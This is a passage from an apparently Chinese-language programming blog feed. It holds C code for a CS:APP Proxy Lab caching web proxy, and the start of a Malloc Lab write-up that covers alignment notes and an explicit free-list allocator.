class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">/* Recommended max cache and object sizes */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_CACHE_SIZE 1049000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_OBJECT_SIZE 102400</span><br><br><span class="hljs-type">char</span> BUF[MAX_CACHE_SIZE];<br><span class="hljs-type">char</span> TMP[MAX_OBJECT_SIZE];<br><span class="hljs-type">int</span> LRU[<span class="hljs-number">10</span>];<br><span class="hljs-type">int</span> cnt = <span class="hljs-number">0</span>, clk = <span class="hljs-number">0</span>;<br><span class="hljs-type">char</span> REC[<span class="hljs-number">10</span>][<span class="hljs-number">2500</span>];<br><span class="hljs-type">sem_t</span> mutex_cnt, write_lock, mutex_tmp;<br><br><span class="hljs-comment">// ignore</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">sigpipe_handler</span><span class="hljs-params">(<span class="hljs-type">int</span> sig)</span> &#123;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">init_sem</span><span class="hljs-params">()</span> &#123;<br>    sem_init(&amp;mutex_cnt, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>);<br>    sem_init(&amp;mutex_tmp, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>);<br>    sem_init(&amp;write_lock, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">read_cache</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">char</span> *fn)</span> &#123;<br>    <span class="hljs-type">int</span> sign = <span class="hljs-number">0</span>, id;<br>    P(&amp;mutex_cnt);<br>    <span class="hljs-keyword">if</span> (cnt == <span class="hljs-number">0</span>) <br>        P(&amp;write_lock);<br>    cnt++;<br>    V(&amp;mutex_cnt);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) &#123;<br>        <span class="hljs-keyword">if</span> (LRU[i] != <span class="hljs-number">-1</span> &amp;&amp; <span class="hljs-built_in">strcmp</span>(fn, REC[i]) == <span class="hljs-number">0</span>) &#123;<br>            Rio_writen(fd, &amp;BUF[MAX_OBJECT_SIZE * i], MAX_OBJECT_SIZE);<br>            sign = <span class="hljs-number">1</span>;<br>            id = i;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125; <br><br>    P(&amp;mutex_cnt);<br>    cnt--;<br>    <span class="hljs-keyword">if</span> (sign) &#123;<br>        LRU[id] = clk++;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (cnt == <span class="hljs-number">0</span>) &#123;<br>        V(&amp;write_lock);<br>    &#125;<br>    V(&amp;mutex_cnt);<br>    <br>    <span class="hljs-keyword">return</span> sign;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">write_cache</span><span class="hljs-params">(<span class="hljs-type">char</span> *fn, <span class="hljs-type">char</span> *buf)</span> &#123;<br>    P(&amp;write_lock);<br>    <span class="hljs-type">int</span> cid, cv = INT_MAX;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) &#123;<br>        <span class="hljs-keyword">if</span> (LRU[i] &lt; cv) &#123;<br>            cv = LRU[i];<br>            cid = i;<br>        &#125;<br>    &#125;<br>    LRU[cid] = clk++;<br>    <span class="hljs-built_in">strcpy</span>(&amp;BUF[cid * MAX_OBJECT_SIZE], buf);<br>    <span class="hljs-built_in">strcpy</span>(REC[cid], fn);<br>    V(&amp;write_lock);<br>&#125;<br><br><span class="hljs-comment">// 2500 Byte 存储信息int 250 Byte</span><br><span class="hljs-comment">/* You won&#x27;t lose style points for including this long line in your code */</span><br><span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-type">char</span> *user_agent_hdr = <span class="hljs-string">&quot;User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:10.0.3) Gecko/20120305 Firefox/10.0.3\r\n&quot;</span>;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">parse_cmd</span><span class="hljs-params">(<span class="hljs-type">char</span> *url, <span class="hljs-type">char</span> *host, <span class="hljs-type">char</span> *port, <span class="hljs-type">char</span> *method, <span class="hljs-type">char</span> *uri)</span>; <br><br><span class="hljs-type">void</span> *<span class="hljs-title function_">exe_cmd</span><span class="hljs-params">(<span class="hljs-type">void</span> *vargp)</span> &#123;<br>    Pthread_detach(pthread_self());<br>    <span class="hljs-type">int</span> client_fd, server_fd, stat;<br>    client_fd = *((<span class="hljs-type">int</span>*)vargp);<br>    Free(vargp);<br>    <span class="hljs-type">char</span> buf[MAXLINE], host[MAXLINE], port[MAXLINE], method[MAXLINE], uri[MAXLINE], header[MAXLINE];<br>    <span class="hljs-type">char</span> PAK[MAX_OBJECT_SIZE + <span class="hljs-number">1</span>], SIGN[MAXLINE];<br>    <span class="hljs-type">char</span> version[MAXLINE] = <span class="hljs-string">&quot;HTTP/1.0&quot;</span>;<br>    <span class="hljs-type">rio_t</span> rio_c, rio_s;<br><br>    Rio_readinitb(&amp;rio_c, client_fd);<br>    <span class="hljs-keyword">if</span> (!Rio_readlineb(&amp;rio_c, buf, MAXLINE))  <span class="hljs-comment">//line:netp:doit:readrequest</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>, buf);<br>    parse_cmd(buf, host, port, method, uri);<br>    <span class="hljs-comment">// printf(&quot;HOST: %s\nPORT: %s\nMETHOD: %s\nURI: %s\n&quot;, host, port, method, uri);</span><br>    <span class="hljs-built_in">sprintf</span>(SIGN, <span class="hljs-string">&quot;%s %s %s %s&quot;</span>, host, port, method, uri);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, SIGN);<br><br>    <span class="hljs-type">int</span> in_cache = read_cache(client_fd, SIGN);<br>    <span class="hljs-keyword">if</span> (in_cache) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;IN!\n&quot;</span>);<br>        Close(client_fd);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br>    <span class="hljs-comment">// 打开server并发送头文件</span><br>    server_fd = Open_clientfd(host, port); <br>    <span class="hljs-comment">// printf(&quot;%d\n&quot;, server_fd);</span><br>    Rio_readinitb(&amp;rio_s, server_fd);<br>    <span class="hljs-built_in">sprintf</span>(header, <span class="hljs-string">&quot;%s %s %s\r\n&quot;</span>, method, uri, version);<br>    <span class="hljs-built_in">sprintf</span>(header, <span class="hljs-string">&quot;%sConnection: close\r\n&quot;</span>, header);<br>    <span class="hljs-built_in">sprintf</span>(header, <span class="hljs-string">&quot;%sProxy-Connection: close\r\n&quot;</span>, header);<br>    <span class="hljs-built_in">sprintf</span>(header, <span class="hljs-string">&quot;%s%s\r\n&quot;</span>, header, user_agent_hdr);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>, header);<br>    Rio_writen(server_fd, header, <span class="hljs-keyword">sizeof</span>(header));<br>    <span class="hljs-comment">// printf(&quot;%s&quot;, header);</span><br><br>    <span class="hljs-type">int</span> count = <span class="hljs-number">0</span>, sign = <span class="hljs-number">0</span>;<br>    <span class="hljs-comment">// ? 是否全部Cache</span><br>    <span class="hljs-keyword">while</span> ((stat = Rio_readnb(&amp;rio_s, PAK, <span class="hljs-keyword">sizeof</span>(PAK))) &gt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-comment">// printf(&quot;%s&quot;, buf);</span><br>        <span class="hljs-comment">// strcat(content, buf);</span><br>        <span class="hljs-comment">// Rio_writen(client_fd, buf, sizeof(buf));</span><br>        <span class="hljs-comment">// 说明是可Cache的</span><br>        <span class="hljs-keyword">if</span> (count == <span class="hljs-number">0</span> &amp;&amp; stat &lt;= <span class="hljs-keyword">sizeof</span>(PAK) - <span class="hljs-number">1</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;GET!\n&quot;</span>);<br>            sign = <span class="hljs-number">1</span>;<br>            write_cache(SIGN, PAK);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>, PAK);<br>            Rio_writen(client_fd, PAK, stat);<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;LARGE!\n&quot;</span>);<br>            Rio_writen(client_fd, PAK, <span class="hljs-keyword">sizeof</span>(PAK));<br>            count++;<br>        &#125;<br>    &#125;<br>    Close(client_fd);<br>    Close(server_fd);<br>    <span class="hljs-comment">// printf(&quot;%s&quot;, content);</span><br>    <span class="hljs-comment">// Rio_writen(client_fd, content, sizeof(content));</span><br>    <span class="hljs-comment">// printf(&quot;%d\n&quot;, stat);</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>**argv)</span> &#123;<br>    <span class="hljs-comment">// printf(&quot;%s&quot;, user_agent_hdr);</span><br>    <span class="hljs-type">int</span> listenfd, connfd;<br>    <span class="hljs-type">char</span> hostname[MAXLINE], port[MAXLINE];<br>    <span class="hljs-type">socklen_t</span> clientlen;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_storage</span> <span class="hljs-title">clientaddr</span>;</span><br>    <span class="hljs-type">pthread_t</span> tid;<br>    init_sem();<br>    <br>    <span class="hljs-comment">// 处理Signal</span><br>    Signal(SIGPIPE, sigpipe_handler);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;start\n&quot;</span>);<br>    <span class="hljs-comment">/* Check command line args */</span><br>    <span class="hljs-keyword">if</span> (argc != <span class="hljs-number">2</span>) &#123;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;usage: %s &lt;port&gt;\n&quot;</span>, argv[<span class="hljs-number">0</span>]);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br><br>    listenfd = Open_listenfd(argv[<span class="hljs-number">1</span>]);<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>    clientlen = <span class="hljs-keyword">sizeof</span>(clientaddr);<br>        <span class="hljs-type">int</span> *tr = (<span class="hljs-type">int</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>    connfd = Accept(listenfd, (SA *)&amp;clientaddr, &amp;clientlen); <span class="hljs-comment">//line:netp:tiny:accept</span><br>        *tr = connfd;<br>        Getnameinfo((SA *) &amp;clientaddr, clientlen, hostname, MAXLINE, <br>                    port, MAXLINE, <span class="hljs-number">0</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Accepted connection from (%s, %s)\n&quot;</span>, hostname, port);<br>        pthread_create(&amp;tid, <span class="hljs-literal">NULL</span>, exe_cmd, tr);<br>        <span class="hljs-comment">// char buf[100] = &quot;ret\n&quot;;</span><br>        <span class="hljs-comment">// Rio_writen(connfd, buf, sizeof(buf));</span><br>        <span class="hljs-comment">// exe_cmd(connfd);</span><br>    <span class="hljs-comment">// Close(connfd);                                            //line:netp:tiny:close</span><br>    &#125;<br><br>    <span class="hljs-comment">// </span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">parse_cmd</span><span class="hljs-params">(<span class="hljs-type">char</span> *url, <span class="hljs-type">char</span> *host, <span class="hljs-type">char</span> *port, <span class="hljs-type">char</span> *method, <span class="hljs-type">char</span> *uri)</span> &#123;<br>    <span class="hljs-type">char</span> *ptr;<br><br>    <span class="hljs-comment">// 得到method</span><br>    ptr = <span class="hljs-built_in">strchr</span>(url, <span class="hljs-string">&#x27; &#x27;</span>);<br>    *ptr = <span class="hljs-string">&#x27;\0&#x27;</span>; <br>    <span class="hljs-built_in">strcpy</span>(method, url);<br>    ptr++;<br>    <span class="hljs-keyword">while</span> (*ptr == <span class="hljs-string">&#x27; &#x27;</span>) <br>        ptr++;<br>    url = ptr;<br>    <br>    <span class="hljs-comment">// 删除http://</span><br>    ptr = <span class="hljs-built_in">strstr</span>(url, <span class="hljs-string">&quot;http://&quot;</span>);<br>    <span class="hljs-keyword">if</span> (ptr != <span class="hljs-literal">NULL</span>) <br>        url = ptr + <span class="hljs-number">7</span>;<br><br>    <span class="hljs-comment">// 忽略version</span><br>    ptr = <span class="hljs-built_in">strchr</span>(url, <span class="hljs-string">&#x27; &#x27;</span>);<br>    <span class="hljs-keyword">if</span> (ptr != <span class="hljs-literal">NULL</span>) <br>        *ptr = <span class="hljs-string">&#x27;\0&#x27;</span>;<br><br>    <span class="hljs-comment">// 处理uri</span><br>    ptr = <span class="hljs-built_in">strchr</span>(url, <span class="hljs-string">&#x27;/&#x27;</span>);<br>    <span class="hljs-keyword">if</span> (ptr != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">strcpy</span>(uri, ptr);<br>        *ptr = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">strcpy</span>(uri, <span class="hljs-string">&quot;/&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">// port </span><br>    ptr = <span class="hljs-built_in">strchr</span>(url, <span class="hljs-string">&#x27;:&#x27;</span>);<br>    <span class="hljs-keyword">if</span> (ptr == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">strcpy</span>(port, <span class="hljs-string">&quot;80&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">strcpy</span>(port, ptr + <span class="hljs-number">1</span>);<br>        *ptr = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-built_in">strcpy</span>(host, url);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>totalScore: 70/70</p>]]></content>
    
    
    
    <tags>
      
      <tag>CS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CS:APP Malloc Lab记录</title>
    <link href="/2023/07/12/malloc/"/>
    <url>/2023/07/12/malloc/</url>
    
    <content type="html"><![CDATA[<h2 id="前置知识">前置知识</h2><h3 id="内存对齐">内存对齐</h3><p>从Cache和内存的读写方式可以看出，内存采用</p><p>参考CPU读取内存的方式，</p><h3 id="常见分配方式">常见分配方式</h3><p>MMU处理虚拟内存借助页表映射，而对于C语言而言，malloc得到的堆中的虚拟内存，需要连续的虚拟空间。</p><p>借助内置malloc申请一大块空间，就可以模拟这个过程。</p><p>有多种数据。</p><ol type="1"><li>每一块包括前缀、后缀，顺序访问</li><li>双向链表</li><li>分块 + 二进制分块</li><li>特别的系统，只存在2^i的对象，可以不断二分分配空间。</li></ol><h2 id="双向链表">双向链表</h2><h3 id="基本思路">基本思路</h3><p>将空闲块通过双向链表组织，双向链表可以O(1)调整，可以从逻辑上排序链表，而不基于物理空间的遍历。</p><h3 id="细节处理">细节处理</h3><ol type="1"><li>确保每个块的开头Alignment</li><li>需要增加LOG系统，便于调试链表出问题的位置</li><li>可以借助链接等方式，优先调用mymalloc，用于对比mymalloc和标准库的性能。DLL- MAP .data .plt Call - 物理地址</li></ol><h3 id="code">Code</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-comment">/* single word (4) or double word (8) alignment */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ALIGNMENT 8</span><br><br><span class="hljs-comment">// malloc所需的数据结构</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> HEADER (sizeof(size_t))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> FOOTER (sizeof(size_t))</span><br><span class="hljs-comment">// 两个指针</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> EXTRA (2*sizeof(void*))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> FILL (ALIGN(HEADER + EXTRA))</span><br><br><span class="hljs-comment">/* rounds up to the nearest multiple of ALIGNMENT */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ALIGN(size) (((size) + (ALIGNMENT-1)) &amp; ~0x7)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SIZE_T_SIZE (ALIGN(sizeof(size_t)))</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX(x, y) ((x) &gt; (y)? (x) : (y))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> GET(p) (*(size_t *)(p))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> GET_P(p) (*(void **)(p))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> GET_SIZE(p) (GET(p) &amp; ~0x7)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> GET_ALLOC(p) (GET(p) &amp; 0x1)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> GET_PREV(p) (GET_P(p + HEADER))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> GET_NEXT(p) (GET_P(p + HEADER + sizeof(void*)))</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SET(p) (*(size_t*)(p) = (GET(p) | 1))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PUT(p, val) (*(size_t *)(p) = (val))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PUT_F(p, val) (*(size_t *)(p + val - FOOTER) = (val))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PUT_P(p, val) (*(void **)(p) = (val))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PUT_PREV(p, val) (PUT_P(p + HEADER, val))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PUT_NEXT(p, val) (PUT_P(p + HEADER + sizeof(void*), val))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> FULL_SIZE(content) (ALIGN(FILL + content + FOOTER))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SPACE(sz) (sz - FILL - FOOTER)</span><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">del_p</span><span class="hljs-params">(<span class="hljs-type">void</span> *p)</span></span>;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> *START, *END;<br><span class="hljs-type">static</span> <span class="hljs-type">void</span> *FP = <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">set_blk</span><span class="hljs-params">(<span class="hljs-type">void</span> *p, <span class="hljs-type">size_t</span> sz)</span> </span>&#123;<br>    <span class="hljs-built_in">PUT</span>(p, sz);<br>    <span class="hljs-built_in">PUT_F</span>(p, sz);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">insert_head</span><span class="hljs-params">(<span class="hljs-type">void</span> *p)</span> </span>&#123;<br>    <span class="hljs-comment">// printf(&quot;insert: %x\n&quot;, (uintptr_t)p);</span><br>    <span class="hljs-built_in">PUT_PREV</span>(p, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-keyword">if</span> (FP == <span class="hljs-literal">NULL</span>) &#123;<br>        FP = p;<br>        <span class="hljs-built_in">PUT_NEXT</span>(p, <span class="hljs-literal">NULL</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">PUT_NEXT</span>(p, FP);<br>        <span class="hljs-built_in">PUT_PREV</span>(FP, p);<br>        FP = p;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * mm_init - initialize the malloc package.</span><br><span 